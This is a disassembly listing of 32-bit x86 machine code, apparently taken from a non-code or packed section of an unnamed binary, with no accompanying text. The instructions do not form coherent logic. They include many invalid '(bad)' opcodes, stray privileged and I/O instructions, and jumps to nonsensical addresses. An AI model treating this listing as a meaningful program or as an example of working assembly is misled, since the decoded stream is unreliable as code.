  4204b2:	scas   eax,DWORD PTR es:[edi]
  4204b3:	xchg   BYTE PTR [esi+ecx*1-0x5bf20b2e],dh
  4204ba:	inc    edi
  4204bb:	shl    DWORD PTR [ebx+ebx*2+0x61],cl
  4204bf:	sub    al,0xd7
	...
  420531:	add    BYTE PTR [eax],al
  420533:	add    BYTE PTR [eax+0x34],bh
  420536:	add    bh,bl
  420538:	dec    esi
  420539:	(bad)  
  42053a:	stc    
  42053b:	mov    bh,0x14
  42053d:	clc    
  42053e:	add    al,0xe1
  420540:	sub    edx,eax
  420542:	gs mov dl,0x4e
  420545:	pop    edx
  420546:	add    DWORD PTR [eax],eax
  420548:	cmc    
  420549:	add    BYTE PTR [eax],al
  42054b:	add    BYTE PTR [edx+eiz*8+0x6],bh
  42054f:	arpl   WORD PTR [ecx-0x11],bp
  420552:	leave  
  420553:	gs sub ecx,esp
  420556:	adc    bl,BYTE PTR [edx]
  420558:	fnstcw WORD PTR [ecx+0x1dd1618e]
  42055e:	mov    edx,0xdd597ada
  420563:	ficom  DWORD PTR [edx]
  420565:	fdiv   QWORD PTR [edi+ecx*1+0x6c]
  420569:	pcmpgtb mm3,QWORD PTR [edx-0x121fcf61]
  420570:	or     DWORD PTR [ecx+0x44170e61],esp
  420576:	fld    st(2)
  420578:	xchg   ebx,eax
  420579:	or     esi,DWORD PTR [edx]
  42057b:	sahf   
  42057c:	arpl   WORD PTR [edx],ax
  42057e:	mov    ecx,0x19350a1
  420583:	and    al,0x28
  420585:	out    dx,eax
  420586:	xor    eax,0xdb50ccd7
  42058b:	lds    ebx,FWORD PTR ds:0x1f708621
  420591:	aad    0x10
  420593:	test   DWORD PTR [esi],ebx
  420595:	js     0x42055e
  420597:	into   
  420598:	fisttp QWORD PTR [eax+0x11]
  42059b:	mov    ah,0xbc
  42059d:	fistp  QWORD PTR [edi+ebx*8]
  4205a0:	iret   
  4205a1:	inc    esi
  4205a2:	sub    DWORD PTR [ecx-0x77],ecx
  4205a5:	pop    es
  4205a6:	push   edi
  4205a7:	pop    ebp
  4205a8:	clc    
  4205a9:	adc    bh,BYTE PTR [eax]
  4205ab:	pop    es
  4205ac:	loopne 0x420558
  4205ae:	cs popf 
  4205b0:	call   0xc7cc5756
  4205b5:	mov    dh,0xb7
  4205b7:	pop    ebx
  4205b8:	outs   dx,BYTE PTR ds:[esi]
  4205b9:	mov    ecx,DWORD PTR [edi-0x51]
  4205bc:	int3   
  4205bd:	or     eax,0xd1a4d002
  4205c2:	mov    al,0xcf
  4205c4:	retf   
  4205c5:	stos   DWORD PTR es:[edi],eax
  4205c6:	sbb    edi,DWORD PTR [edi]
  4205c8:	or     bh,BYTE PTR [eax]
  4205ca:	aam    0x90
  4205cc:	sar    BYTE PTR [ebx],cl
  4205ce:	rcr    DWORD PTR [ecx+0xb],1
  4205d1:	push   ecx
  4205d2:	ins    DWORD PTR es:[edi],dx
  4205d3:	jnp    0x420603
  4205d5:	adc    ebp,ecx
  4205d7:	fs sub eax,edx
  4205da:	inc    ecx
  4205db:	inc    edx
  4205dc:	pop    ds
  4205dd:	jns    0x420642
  4205df:	push   ecx
  4205e0:	xchg   BYTE PTR [ecx-0x1bc47aed],ch
  4205e6:	or     ah,BYTE PTR [ebp+0x5f64af1d]
  4205ec:	cdq    
  4205ed:	mov    ds:0x624141f6,eax
  4205f2:	push   ebp
  4205f3:	mov    eax,ds:0x19c3f207
  4205f8:	xchg   esi,eax
  4205f9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4205fa:	in     eax,0xd7
  4205fc:	gs xchg edi,eax
  4205fe:	and    ecx,DWORD PTR [ecx]
  420600:	retf   0x4b85
  420603:	mov    esp,0x8ad36152
  420608:	(bad)  
  420609:	sbb    eax,0x2a7097a1
  42060e:	scas   eax,DWORD PTR es:[edi]
  42060f:	es (bad) 
  420611:	mov    al,ds:0xdfb0dc42
  420616:	xchg   edx,eax
  420617:	xchg   ebp,eax
  420618:	and    BYTE PTR [edi-0x22],0x6b
  42061c:	jno    0x42067b
  42061e:	popa   
  42061f:	daa    
  420620:	xchg   ebx,eax
  420621:	dec    esp
  420622:	in     eax,dx
  420623:	push   0x28a47d4
  420628:	mov    cl,0xa0
  42062a:	jecxz  0x4205d3
  42062c:	mov    al,0x94
  42062e:	pop    ss
  42062f:	adc    DWORD PTR [ecx+0x41],eax
  420632:	int    0x85
  420634:	test   al,0xf3
  420636:	mov    ds:0x455ac9db,al
  42063b:	mov    bl,0xe0
  42063d:	frstor [ebp+ebx*2+0x28]
	...
  4206b4:	xchg   edx,eax
  4206b5:	cmp    al,0x23
  4206b7:	jle    0x420668
  4206b9:	jg     0x42069a
  4206bb:	cld    
  4206bc:	jo     0x4206a6
  4206be:	hlt    
  4206bf:	leave  
  4206c0:	jg     0x4206e9
  4206c2:	mov    edx,0x15b4364
  4206c7:	add    ch,dh
  4206c9:	add    BYTE PTR [eax],al
  4206cb:	add    BYTE PTR [ebx+0xec2d96a],cl
  4206d1:	in     eax,0x1f
  4206d3:	stc    
  4206d4:	ja     0x420675
  4206d6:	mov    DWORD PTR [ecx+esi*1-0x635412fa],0xf6e68a1d
  4206e1:	jl     0x420733
  4206e3:	mov    ecx,0x9ea364f2
  4206e8:	mov    ds:0xbda87076,al
  4206ed:	mov    ch,0xdd
  4206ef:	out    0xf7,eax
  4206f1:	fiadd  DWORD PTR [esp+ebx*1-0x27]
  4206f5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206f6:	mov    al,ds:0x84e7ef56
  4206fb:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4206fc:	inc    ebx
  4206fd:	das    
  4206fe:	nop
  4206ff:	shl    edi,cl
  420701:	neg    DWORD PTR [ebx-0x2f]
  420704:	dec    eax
  420705:	or     edi,eax
  420707:	cld    
  420708:	xchg   ecx,eax
  420709:	pusha  
  42070a:	sahf   
  42070b:	sahf   
  42070c:	or     eax,0x445e7cf8
  420711:	stos   DWORD PTR es:[edi],eax
  420712:	jge    0x4206d3
  420714:	and    ebx,eax
  420716:	fdiv   DWORD PTR [edi]
  420718:	hlt    
  420719:	in     eax,0x61
  42071b:	sbb    eax,0xfeefd09a
  420720:	jno    0x420717
  420722:	ins    BYTE PTR es:[edi],dx
  420723:	loopne 0x420798
  420725:	ins    DWORD PTR es:[edi],dx
  420726:	push   ecx
  420727:	mov    al,0x83
  420729:	pminsw mm3,QWORD PTR [esi+0x1e]
  42072d:	inc    eax
  42072e:	sub    ah,BYTE PTR [ecx-0x2e]
  420731:	mov    cl,0xf5
  420733:	lods   eax,DWORD PTR ds:[esi]
  420734:	mov    eax,DWORD PTR es:[edi-0x5a]
  420738:	add    al,0xcb
  42073a:	clc    
  42073b:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42073c:	cmp    eax,0xb3377826
  420741:	ds dec edx
  420743:	sbb    al,0x70
  420745:	rcl    BYTE PTR [ecx],0x31
  420748:	push   eax
  420749:	loope  0x4206d0
  42074b:	mov    eax,DWORD PTR [ebp-0x417728a6]
  420751:	outs   dx,BYTE PTR ds:[esi]
  420752:	adc    eax,DWORD PTR [edx+0xebef6cf]
  420758:	ss in  eax,dx
  42075a:	lods   al,BYTE PTR ds:[esi]
  42075b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42075c:	mov    ds:0x8c303e3f,al
  420761:	gs jae 0x4206f5
  420764:	dec    eax
  420765:	sub    eax,0xd72b6bb7
  42076a:	dec    esi
  42076b:	cmp    ch,BYTE PTR ds:0x2a3b803c
  420771:	mov    esi,fs
  420773:	lock push cs
  420775:	retf   0x7512
  420778:	shr    BYTE PTR [ebx],0x1e
  42077b:	enter  0x486f,0x91
  42077f:	aas    
  420780:	scas   al,BYTE PTR es:[edi]
  420781:	push   eax
  420782:	data16 mov ds:0xc57dde06,al
  420788:	je     0x4207d4
  42078a:	gs jg  0x42072c
  42078d:	lea    esp,[eax+edx*4+0x5da1f62]
  420794:	loope  0x420789
  420796:	pop    bx
  420798:	in     eax,0x93
  42079a:	int3   
  42079b:	mov    al,0x2b
  42079d:	xchg   esi,eax
  42079e:	mov    ds:0x87f4d2da,eax
  4207a3:	cmc    
  4207a4:	(bad)  [ecx]
  4207a6:	cmp    eax,0xa25c5d16
  4207ab:	jns    0x4207b3
  4207ad:	sbb    BYTE PTR [edi+ecx*1],cl
  4207b0:	es pop edx
  4207b2:	mov    ds:0x9e4973d2,eax
  4207b7:	or     edi,DWORD PTR [edi+edx*1]
  4207ba:	mov    eax,ds:0x7e4ab64b
  4207bf:	dec    ebx
  4207c0:	icebp  
	...
  420831:	add    BYTE PTR [eax],al
  420833:	add    BYTE PTR [ecx+0x3b920b9a],ah
  420839:	xchg   ebx,eax
  42083a:	mov    ecx,0xafa823bb
  42083f:	mov    bh,0x9e
  420841:	jne    0x4207e5
  420843:	adc    DWORD PTR [eax],edi
  420845:	pop    esp
  420846:	add    DWORD PTR [eax],eax
  420848:	cmc    
  420849:	add    BYTE PTR [eax],al
  42084b:	add    dh,dl
  42084d:	inc    edi
  42084e:	je     0x420810
  420850:	pop    ecx
  420851:	dec    edx
  420852:	scas   al,BYTE PTR es:[edi]
  420853:	inc    esp
  420854:	fwait
  420855:	loop   0x4207f0
  420857:	outs   dx,BYTE PTR ds:[esi]
  420858:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420859:	test   bh,cl
  42085b:	loop   0x420892
  42085d:	jb     0x42084c
  42085f:	(bad)  
  420860:	out    0xf0,al
  420862:	adc    bh,cl
  420864:	push   ecx
  420865:	pop    ds
  420866:	mov    DWORD PTR [ebx],ebp
  420868:	and    edx,ebp
  42086a:	mov    esi,0xeccca12e
  42086f:	mov    dh,0x9
  420871:	jno    0x42087b
  420873:	jb     0x420804
  420875:	(bad)  
  420876:	hlt    
  420877:	outs   dx,BYTE PTR ds:[si]
  420879:	aas    
  42087a:	add    dh,BYTE PTR [ebp+0x3e]
  42087d:	or     dh,bh
  42087f:	or     eax,0xac3c3d92
  420884:	sub    al,0xe0
  420886:	pop    esi
  420887:	push   eax
  420888:	test   al,0xf5
  42088a:	mov    ds:0x7dc5b4ee,al
  42088f:	cdq    
  420890:	mov    cl,0xd6
  420892:	or     ebx,DWORD PTR [ecx+0x70]
  420895:	jae    0x4208fd
  420897:	add    al,0x49
  420899:	pop    ss
  42089a:	push   eax
  42089b:	or     esp,ebx
  42089d:	pop    ss
  42089e:	outs   dx,DWORD PTR ds:[esi]
  42089f:	inc    edi
  4208a0:	fucomi st,st(0)
  4208a2:	inc    eax
  4208a3:	mov    bh,0xdb
  4208a5:	(bad)  
  4208a6:	maskmovq mm7,(bad)
  4208a7:	idiv   DWORD PTR [eax]
  4208a9:	sub    eax,0x5c75197f
  4208ae:	(bad)  
  4208af:	sub    al,0x40
  4208b1:	sbb    al,0x50
  4208b3:	lea    ecx,[eax]
  4208b5:	fdivr  QWORD PTR [edi-0x2f9c7eaf]
  4208bb:	mov    ebx,0x7a61af6
  4208c0:	add    DWORD PTR [edx+0x5e1227e0],edx
  4208c6:	mov    ch,0x39
  4208c8:	shr    DWORD PTR [eax-0x18],cl
  4208cb:	dec    esi
  4208cc:	aad    0x42
  4208ce:	div    dl
  4208d0:	loope  0x420941
  4208d2:	mov    cl,0xc4
  4208d4:	pushf  
  4208d5:	fwait
  4208d6:	hlt    
  4208d7:	mov    edx,0xa5c701e6
  4208dc:	(bad)  
  4208dd:	enter  0x24c4,0xfc
  4208e1:	imul   edi,DWORD PTR [edx+ecx*4],0x5f
  4208e5:	xor    al,dh
  4208e7:	adc    DWORD PTR [ecx-0x1ba34e93],0xd9e42a6b
  4208f1:	jl     0x4208ee
  4208f3:	xchg   ecx,eax
  4208f4:	push   eax
  4208f5:	lods   eax,DWORD PTR ds:[esi]
  4208f6:	push   ds
  4208f7:	inc    edx
  4208f8:	add    DWORD PTR [edi+0x2e],esi
  4208fb:	inc    edi
  4208fc:	push   eax
  4208fd:	add    ah,ch
  4208ff:	pop    es
  420900:	lea    ecx,[edx+0x22]
  420903:	xchg   esi,eax
  420904:	add    ecx,DWORD PTR [ecx+0x2978750d]
  42090a:	retf   0x1ea1
  42090d:	mov    dh,0xfa
  42090f:	(bad)  
  420910:	fwait
  420911:	and    esi,DWORD PTR [eax+ecx*2+0x6f]
  420915:	mov    ds:0x1fe76f53,al
  42091a:	sbb    BYTE PTR [edx+0x0],al
  42091d:	dec    edx
  42091e:	das    
  42091f:	mov    ebx,DWORD PTR [ebp+esi*1+0x5c810dc5]
  420926:	lock fmul QWORD PTR [edi-0x28426dd5]
  42092d:	ins    BYTE PTR es:[edi],dx
  42092e:	ret    0x71d1
  420931:	adc    esi,edx
  420933:	js     0x4208e1
  420935:	xor    eax,0xa7528c47
  42093a:	outs   dx,DWORD PTR ds:[esi]
  42093b:	pop    edi
  42093c:	inc    edx
  42093d:	repz push 0xffffffa3
  420940:	add    al,BYTE PTR [eax]
	...
  4209b2:	add    BYTE PTR [eax],al
  4209b4:	or     al,BYTE PTR [ecx-0x49]
  4209b7:	mov    eax,ds:0xeb1ef7ff
  4209bc:	rcr    BYTE PTR [esi-0x5cf39922],0x66
  4209c3:	dec    edi
  4209c4:	sub    eax,0xf500015d
  4209c9:	add    BYTE PTR [eax],al
  4209cb:	add    BYTE PTR ds:0xc2185729,dl
  4209d1:	adc    eax,0x7f4c860d
  4209d6:	push   ebp
  4209d7:	dec    esp
  4209d8:	fmul   QWORD PTR [ebx]
  4209da:	push   esp
  4209db:	out    0x46,al
  4209dd:	xor    eax,0xd52b24e2
  4209e2:	cmp    eax,0x53ccecd1
  4209e7:	xor    al,0x38
  4209e9:	das    
  4209ea:	clc    
  4209eb:	(bad)  
  4209ec:	imul   esp,DWORD PTR [edi-0x375b35b],0x54a43716
  4209f6:	stos   BYTE PTR es:[edi],al
  4209f7:	jnp    0x4209e2
  4209f9:	shl    esp,cl
  4209fb:	aad    0xc1
  4209fd:	push   cs
  4209fe:	jae    0x4209ab
  420a00:	(bad)  
  420a01:	jl     0x4209a0
  420a03:	dec    edi
  420a04:	mov    dh,bh
  420a06:	je     0x420a70
  420a08:	(bad)  
  420a0a:	(bad)  
  420a0b:	push   edx
  420a0c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420a0d:	xor    bl,0x55
  420a10:	or     dh,BYTE PTR [edi+0x4fc34227]
  420a16:	add    eax,0xce82b5e4
  420a1b:	jns    0x420a5c
  420a1d:	mov    eax,ds:0xf3552af8
  420a22:	iretw  
  420a24:	pop    esi
  420a25:	cmp    al,0x25
  420a27:	push   0xe7681309
  420a2c:	fs sahf 
  420a2e:	scas   al,BYTE PTR es:[edi]
  420a2f:	dec    esp
  420a30:	jmp    FWORD PTR [edx+0x53]
  420a33:	inc    ebp
  420a34:	xor    eax,0xd049005b
  420a39:	in     al,dx
  420a3a:	bound  esi,QWORD PTR cs:[ecx]
  420a3d:	int3   
  420a3e:	push   ds
  420a3f:	mov    BYTE PTR [edx+0xfcd7bde],ah
  420a45:	push   ebp
  420a46:	fistp  WORD PTR [edx+0x46]
  420a49:	jmp    0x815e:0x93e92d47
  420a50:	stc    
  420a51:	mov    bl,0xc4
  420a53:	pop    edx
  420a54:	cwde   
  420a55:	pop    esp
  420a56:	stc    
  420a57:	icebp  
  420a58:	lea    ecx,ds:0x590d6829
  420a5e:	xlat   BYTE PTR ds:[ebx]
  420a5f:	mov    ds:0xb6734b1,al
  420a64:	call   0x777fe157
  420a69:	leave  
  420a6a:	stos   DWORD PTR es:[edi],eax
  420a6b:	in     eax,dx
  420a6c:	int    0x0
  420a6e:	mov    WORD PTR [edx],?
  420a70:	repnz cli 
  420a72:	mov    cs,WORD PTR [ebx+0x1f]
  420a75:	push   cs
  420a76:	not    BYTE PTR [edi-0x2e]
  420a79:	dec    ebp
  420a7a:	cmp    bl,BYTE PTR [edx]
  420a7c:	xor    esi,ebx
  420a7e:	mov    ch,0xb3
  420a80:	sar    BYTE PTR [edx],0xad
  420a83:	adc    ebx,DWORD PTR [edi-0x1074f5e1]
  420a89:	jl     0x420afe
  420a8b:	sub    eax,0x1f14f6a2
  420a90:	iret   
  420a91:	or     BYTE PTR [edi+0x5d],dl
  420a94:	sbb    ebx,DWORD PTR [ebx+0x9557ed2]
  420a9a:	xlat   BYTE PTR ds:[ebx]
  420a9b:	sub    al,0x71
  420a9d:	les    ebx,FWORD PTR [esp+ebp*4]
  420aa0:	and    BYTE PTR [ebp-0xe7df1bc],0x5d
  420aa7:	pop    eax
  420aa8:	test   al,0x97
  420aaa:	push   edx
  420aab:	add    al,BYTE PTR [edx+0x3]
  420aae:	xlat   BYTE PTR ds:[ebx]
  420aaf:	std    
  420ab0:	lea    edi,[edx-0x31e25ad8]
  420ab6:	jg     0x420a82
  420ab8:	jno    0x420ac6
  420aba:	sbb    al,0xc2
  420abc:	adc    DWORD PTR es:[eax],ecx
  420abf:	sar    ebp,1
	...
  420b31:	add    BYTE PTR [eax],al
  420b33:	add    ah,bl
  420b35:	sub    BYTE PTR [edx-0x119011c],cl
  420b3b:	cmp    BYTE PTR [edi+0x39],dl
  420b3e:	dec    edx
  420b3f:	invd   
  420b41:	and    cl,BYTE PTR [ebp-0x6c]
  420b44:	and    bl,BYTE PTR [esi+0x1]
  420b47:	add    ch,dh
  420b49:	add    BYTE PTR [eax],al
  420b4b:	add    BYTE PTR [edi-0x65],ah
  420b4e:	pop    es
  420b4f:	add    DWORD PTR [edi+0x6f],eax
  420b52:	iret   
  420b53:	dec    ebx
  420b54:	dec    edx
  420b55:	mov    eax,ds:0x4f411c7
  420b5a:	pop    ss
  420b5b:	sbb    al,bl
  420b5d:	and    BYTE PTR gs:[ecx+ecx*2],ah
  420b61:	adc    DWORD PTR [eax-0x41cb5826],eax
  420b67:	fstp   DWORD PTR [edx+0x5e]
  420b6a:	cwde   
  420b6b:	xchg   ebx,eax
  420b6c:	push   esi
  420b6d:	fcmovne st,st(4)
  420b6f:	pop    ss
  420b70:	xchg   edi,eax
  420b71:	fadd   DWORD PTR [ebp-0x6f2c83e0]
  420b77:	aam    0x95
  420b79:	push   esi
  420b7a:	xchg   edi,eax
  420b7b:	mov    ds:0x123dbfca,al
  420b80:	push   esp
  420b81:	jmp    0x420b3e
  420b83:	xchg   edx,eax
  420b84:	mov    esi,0x87c391d3
  420b89:	jnp    0x420bd0
  420b8b:	sahf   
  420b8c:	cmp    al,0xbf
  420b8e:	clc    
  420b8f:	es aad 0x45
  420b92:	repz in eax,dx
  420b94:	xchg   ebx,eax
  420b95:	pop    ebp
  420b96:	mov    ebp,0x4d783f70
  420b9b:	push   esp
  420b9c:	leave  
  420b9d:	es dec esp
  420b9f:	cmp    bl,BYTE PTR [edi]
  420ba1:	in     al,dx
  420ba2:	scas   eax,DWORD PTR es:[edi]
  420ba3:	mov    bh,0x5
  420ba5:	inc    ebp
  420ba6:	mov    edx,ss
  420ba8:	pop    eax
  420ba9:	fidiv  DWORD PTR [ebp-0x2]
  420bac:	inc    esp
  420bad:	scas   al,BYTE PTR es:[edi]
  420bae:	sbb    DWORD PTR [esp+ecx*1-0x5d],esi
  420bb2:	or     al,BYTE PTR [esi+0x462caa06]
  420bb8:	sub    edi,ebp
  420bba:	pop    eax
  420bbb:	or     bh,BYTE PTR [edi-0x79]
  420bbe:	imul   esp,edi,0x416b3793
  420bc4:	es add al,0x75
  420bc7:	ret    0x91c7
  420bca:	stc    
  420bcb:	jnp    0x420c23
  420bcd:	jecxz  0x420c03
  420bcf:	cmp    eax,edi
  420bd1:	cmp    al,BYTE PTR [esi-0x4d]
  420bd4:	mov    esi,0xde8bd593
  420bd9:	add    BYTE PTR [ecx+0x6dda1c96],cl
  420bdf:	mov    bl,0x25
  420be1:	xor    al,0xb
  420be3:	ins    BYTE PTR es:[edi],dx
  420be4:	xchg   edi,eax
  420be5:	test   eax,0xf85796f6
  420bea:	mov    esi,DWORD PTR [edi+eiz*1]
  420bed:	pusha  
  420bee:	std    
  420bef:	mov    eax,0x64601bbf
  420bf4:	mov    ebp,ds
  420bf6:	xchg   ebp,ebx
  420bf8:	lea    esp,[esi-0x8335e07]
  420bfe:	lock or BYTE PTR ds:0x3ead6f49,ah
  420c05:	and    eax,0xf6151b8d
  420c0a:	out    dx,al
  420c0b:	or     ecx,DWORD PTR [esi+0x7104818f]
  420c11:	mov    ds:0xf2847ba1,eax
  420c16:	lock ret 
  420c18:	loope  0x420bdf
  420c1a:	movs   DWORD PTR es:[edi],DWORD PTR cs:[esi]
  420c1c:	xor    al,0xe3
  420c1e:	test   DWORD PTR [ebp-0x5cef5953],ecx
  420c24:	mov    DWORD PTR [esi],eax
  420c26:	adc    BYTE PTR [ecx+0xe],dh
  420c29:	mov    dh,0x7c
  420c2b:	fidiv  WORD PTR [ebx]
  420c2d:	xlat   BYTE PTR ds:[ebx]
  420c2e:	push   ds
  420c2f:	push   cs
  420c30:	push   edi
  420c31:	std    
  420c32:	sar    esp,cl
  420c34:	mov    ch,0x4b
  420c36:	cwde   
  420c37:	cdq    
  420c38:	fst    DWORD PTR [ebx+esi*4]
  420c3b:	adc    ecx,edi
  420c3d:	mov    DWORD PTR [ecx],edx
  420c3f:	popa   
  420c40:	jbe    0x420c42
	...
  420cb2:	add    BYTE PTR [eax],al
  420cb4:	or     al,0x6a
  420cb6:	push   edx
  420cb7:	shl    DWORD PTR [esi-0x7],0x9f
  420cbb:	out    dx,eax
  420cbc:	xchg   ecx,eax
  420cbd:	inc    ecx
  420cbe:	push   0x8b707c5f
  420cc3:	lods   al,BYTE PTR ds:[esi]
  420cc4:	pop    ss
  420cc5:	pop    edi
  420cc6:	add    DWORD PTR [eax],eax
  420cc8:	cmc    
  420cc9:	add    BYTE PTR [eax],al
  420ccb:	add    BYTE PTR [esi-0x992aff1],dh
  420cd1:	xor    al,0x97
  420cd3:	adc    BYTE PTR [edi+0x70],ah
  420cd6:	hlt    
  420cd7:	pop    esp
  420cd8:	sub    eax,0xe78b7cf7
  420cdd:	imul   DWORD PTR [esi-0x50]
  420ce0:	sub    al,BYTE PTR [eax+edx*8-0x3b]
  420ce4:	jae    0x420d2d
  420ce6:	out    dx,al
  420ce7:	mov    al,0xb1
  420ce9:	scas   eax,DWORD PTR es:[edi]
  420cea:	pop    esi
  420ceb:	jno    0xd60daeb5
  420cf1:	stos   BYTE PTR es:[edi],al
  420cf2:	add    BYTE PTR [edi],ch
  420cf4:	test   BYTE PTR [edi+0x21],ch
  420cf7:	jge    0x420d47
  420cf9:	ja     0x420cfc
  420cfb:	test   eax,0x6bc7ce1b
  420d00:	push   ebp
  420d01:	jnp    0x420c8a
  420d03:	xor    ecx,DWORD PTR [esi+0x3]
  420d06:	js     0x420d67
  420d08:	ja     0x420d3c
  420d0a:	mov    ecx,cs
  420d0c:	and    BYTE PTR ds:0xdc64db4b,ah
  420d12:	ficomp WORD PTR [edi]
  420d14:	mov    ecx,DWORD PTR fs:[eax+0x2e]
  420d18:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420d19:	dec    ebp
  420d1a:	adc    DWORD PTR [ecx+0x8],eax
  420d1d:	jae    0x420cdd
  420d1f:	xchg   ebx,eax
  420d20:	push   eax
  420d21:	sbb    DWORD PTR ds:0x74f05f09,ecx
  420d27:	into   
  420d28:	ror    DWORD PTR [ebp-0x64a18a17],cl
  420d2e:	ror    dl,cl
  420d30:	push   0xffffffdb
  420d32:	clc    
  420d33:	fcomip st,st(3)
  420d35:	call   0xbdd7:0xf89d9a41
  420d3c:	sbb    ecx,DWORD PTR [eax]
  420d3e:	test   al,0x72
  420d40:	jno    0x420ce2
  420d42:	cmp    ax,0xefa6
  420d46:	push   esp
  420d47:	mov    DWORD PTR [esi+0x51],0xec3270cb
  420d4e:	outs   dx,DWORD PTR ds:[esi]
  420d4f:	(bad)  
  420d50:	dec    edx
  420d51:	repnz inc edi
  420d53:	push   ds
  420d54:	jp     0x420db6
  420d56:	sub    DWORD PTR [edi],edx
  420d58:	inc    edi
  420d59:	mov    al,ds:0x919353f1
  420d5e:	push   esp
  420d5f:	adc    DWORD PTR [esi],edi
  420d61:	arpl   WORD PTR [eax],si
  420d63:	(bad)  
  420d64:	(bad)  
  420d65:	aad    0x6e
  420d67:	(bad)  [ecx]
  420d69:	sbb    al,0x80
  420d6b:	int    0xae
  420d6d:	mov    BYTE PTR [esi+0x1285c817],ah
  420d73:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420d74:	mov    ch,0x75
  420d76:	sub    eax,0x8e6ff3c9
  420d7b:	pop    ss
  420d7c:	(bad)  
  420d7d:	test   al,0x8e
  420d7f:	push   edx
  420d80:	xchg   ebx,eax
  420d81:	mov    esi,DWORD PTR [ecx-0x4baa0dc2]
  420d87:	test   eax,0xa162a9e9
  420d8c:	int3   
  420d8d:	idiv   BYTE PTR [ecx]
  420d8f:	sar    DWORD PTR [eax-0x45],0x42
  420d93:	or     eax,0xd2cae54a
  420d98:	push   edx
  420d99:	jge    0x420db0
  420d9b:	test   al,0xea
  420d9d:	mov    edx,edi
  420d9f:	or     al,ah
  420da1:	stos   DWORD PTR es:[edi],eax
  420da2:	push   0x7c
  420da4:	test   al,0xd6
  420da6:	outs   dx,DWORD PTR ds:[esi]
  420da7:	imul   ecx,DWORD PTR [esi-0x36],0x81810e1c
  420dae:	push   0x66
  420db0:	out    0xd1,eax
  420db2:	or     DWORD PTR [esi],ebx
  420db4:	pop    eax
  420db5:	jge    0x420dbb
  420db7:	sbb    DWORD PTR ds:0xe941f6c6,esi
  420dbd:	fcom   st(4)
  420dbf:	adc    dh,BYTE PTR [edx]
	...
  420e31:	add    BYTE PTR [eax],al
  420e33:	add    BYTE PTR [edx-0x1865ab],ch
  420e39:	out    dx,eax
  420e3a:	call   FWORD PTR [ebp+0x64]
  420e3d:	inc    ebx
  420e3e:	and    edx,ecx
  420e40:	repz add DWORD PTR fs:[esp+ecx*1+0x60],eax
  420e46:	add    DWORD PTR [eax],eax
  420e48:	cmc    
  420e49:	add    BYTE PTR [eax],al
  420e4b:	add    ah,ch
  420e4d:	mov    WORD PTR [eax],cs
  420e4f:	rcl    DWORD PTR [edx+ebx*2+0x7c],0x97
  420e54:	cli    
  420e55:	std    
  420e56:	std    
  420e57:	push   ds
  420e58:	stos   BYTE PTR es:[edi],al
  420e59:	sub    ebp,DWORD PTR [edi+0x3fc03d6b]
  420e5f:	mov    ebp,0x6d53e0bf
  420e64:	(bad)  
  420e66:	lahf   
  420e67:	pop    esp
  420e68:	fidiv  DWORD PTR [esi+eiz*8-0x64]
  420e6c:	stos   DWORD PTR es:[edi],eax
  420e6d:	xor    esp,DWORD PTR [esi+0x610b8c09]
  420e73:	(bad)  
  420e74:	cld    
  420e75:	or     cl,bh
  420e77:	dec    edi
  420e78:	adc    al,0xc7
  420e7a:	cld    
  420e7b:	ror    DWORD PTR [edx-0x449bb0b7],cl
  420e81:	(bad)  
  420e82:	ss mov edi,0xfac1ff5f
  420e88:	pop    ecx
  420e89:	mov    ecx,0xf050c2c6
  420e8e:	lods   al,BYTE PTR ds:[esi]
  420e8f:	and    DWORD PTR [ebp-0x24],ebp
  420e92:	xor    DWORD PTR [esp+ebx*4],esp
  420e95:	jo     0x420f0e
  420e97:	inc    ebp
  420e98:	jmp    0x2bed:0x5e37eb27
  420e9f:	leave  
  420ea0:	sbb    DWORD PTR [ecx+0x59],esi
  420ea3:	xor    DWORD PTR [edi-0x3f051c8f],0xa60a8cf8
  420ead:	sbb    dl,BYTE PTR [edi]
  420eaf:	repnz aas 
  420eb1:	int    0x6f
  420eb3:	scas   al,BYTE PTR es:[edi]
  420eb4:	popf   
  420eb5:	add    al,0x32
  420eb7:	adc    DWORD PTR [eax],ebp
  420eb9:	push   cs
  420eba:	(bad)  
  420ebb:	dec    ebx
  420ebc:	pop    ebp
  420ebd:	dec    ebp
  420ebe:	and    eax,0xce65d09b
  420ec3:	test   DWORD PTR [edx],esp
  420ec5:	mov    ebp,0xc80b2dcd
  420eca:	fimul  WORD PTR [esi+0x42]
  420ecd:	mov    dh,0x67
  420ecf:	sub    edx,eax
  420ed1:	dec    esi
  420ed2:	(bad)  
  420ed3:	in     al,dx
  420ed4:	hlt    
  420ed5:	setle  dl
  420ed8:	ror    DWORD PTR [eax],0xf4
  420edb:	lods   al,BYTE PTR ds:[esi]
  420edc:	dec    edx
  420edd:	or     eax,0x3846c86d
  420ee2:	cmp    bl,dl
  420ee4:	mov    ch,0xa1
  420ee6:	lock mov ebx,DWORD PTR [ecx]
  420ee9:	sbb    al,0x7c
  420eeb:	out    dx,al
  420eec:	dec    ebp
  420eed:	dec    eax
  420eee:	popa   
  420eef:	mov    al,ds:0xb945f0a8
  420ef4:	std    
  420ef5:	mov    cl,0x7d
  420ef7:	mov    DWORD PTR [ecx],esp
  420ef9:	dec    esp
  420efa:	push   edx
  420efb:	bnd jmp 0x420f24
  420efe:	jl     0x420ee0
  420f00:	sbb    ch,BYTE PTR [ecx+esi*4-0x7df1b29]
  420f07:	xor    ah,BYTE PTR [ebx]
  420f09:	mov    bl,0x66
  420f0b:	push   ebx
  420f0c:	inc    ebx
  420f0d:	xchg   esp,eax
  420f0e:	sti    
  420f0f:	dec    esp
  420f10:	adc    edx,DWORD PTR [edx]
  420f12:	xor    DWORD PTR [esi-0x3],0x5535374d
  420f19:	out    0x1b,eax
  420f1b:	mov    eax,ds:0x4876904b
  420f20:	loopne 0x420f52
  420f22:	mov    eax,ds:0xd273621a
  420f27:	int3   
  420f28:	in     eax,0x3
  420f2a:	dec    ecx
  420f2b:	ror    ah,cl
  420f2d:	popf   
  420f2e:	icebp  
  420f2f:	inc    ebx
